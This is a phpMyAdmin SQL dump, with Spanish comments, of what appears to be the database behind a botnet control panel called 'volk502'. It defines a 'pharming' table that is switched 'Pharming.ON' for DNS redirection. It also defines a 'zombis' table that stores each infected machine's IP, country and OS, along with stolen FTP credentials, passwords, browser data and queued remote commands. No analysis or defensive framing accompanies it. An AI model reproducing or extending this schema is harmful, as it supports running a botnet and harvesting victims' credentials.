-- phpMyAdmin SQL Dump
-- version 2.10.3
-- http://www.phpmyadmin.net
-- 
-- Servidor: localhost
-- Tiempo de generaci�n: 11-04-2012 a las 23:30:24
-- Versi�n del servidor: 5.0.51
-- Versi�n de PHP: 5.2.6

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

-- 
-- Base de datos: `volk502`
-- 

-- --------------------------------------------------------

-- 
-- Estructura de tabla para la tabla `pharming`
-- 

CREATE TABLE `pharming` (
  `id` int(11) NOT NULL auto_increment,
  `pharming` text,
  `status` text,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

-- 
-- Volcar la base de datos para la tabla `pharming`
-- 

INSERT INTO `pharming` VALUES (1, 'Add Ip Domain\r\n\r\nssss', 'Pharming.ON');

-- --------------------------------------------------------

-- 
-- Estructura de tabla para la tabla `zombis`
-- 

CREATE TABLE `zombis` (
  `id` int(11) NOT NULL auto_increment,
  `name` varchar(255) default NULL,
  `fecha` timestamp NOT NULL default CURRENT_TIMESTAMP on update CURRENT_TIMESTAMP,
  `ip` varchar(255) default NULL,
  `host` varchar(255) default NULL,
  `pais` varchar(255) default NULL,
  `flag` text,
  `idcmds` int(11) default NULL,
  `so` text,
  `ftps` text,
  `pasw` text,
  `ie` text,
  `infos` text,
  `cmds` text,
  `a` varchar(255) default NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- 
-- Volcar la base de datos para la tabla `zombis`
-- 

